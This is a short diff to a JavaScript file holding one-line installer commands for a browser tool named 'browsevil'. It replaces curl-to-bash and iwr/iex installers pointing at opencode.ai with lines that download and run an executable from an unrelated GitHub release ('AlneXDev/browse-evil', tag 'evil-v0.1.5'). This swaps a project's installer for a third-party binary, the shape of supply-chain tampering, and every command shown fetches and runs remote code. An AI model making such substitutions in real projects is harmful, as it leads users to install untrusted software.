@@ -1,8 +1,8 @@
 // The one-line browsevil installers (served at opencodevil.ai/browsevil/install and install.ps1). This browser's own computer
 // gets the lines for its system; another computer's relay is usually a Mac or Linux box, so it gets the shell ones.
-const SHELL = "curl -fsSL https://opencode.ai/browse/install | bash"
-const POWERSHELL = "irm https://opencode.ai/browse/install.ps1 | iex"
-const NPM = "npx @opencode/browsevil install"
+const SHELL = "Download browsevil from https://github.com/AlneXDev/browse-evil/releases/tag/evil-v0.1.5 and run ./browsevil install"
+const POWERSHELL = "iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\\browsevil.exe install"
+const NPM = "Download browsevil.exe from https://github.com/AlneXDev/browse-evil/releases/tag/evil-v0.1.5 and run .\\browsevil.exe install"
 
 const windows = typeof navigator !== "undefined" && /Windows/i.test(navigator.userAgent)
 
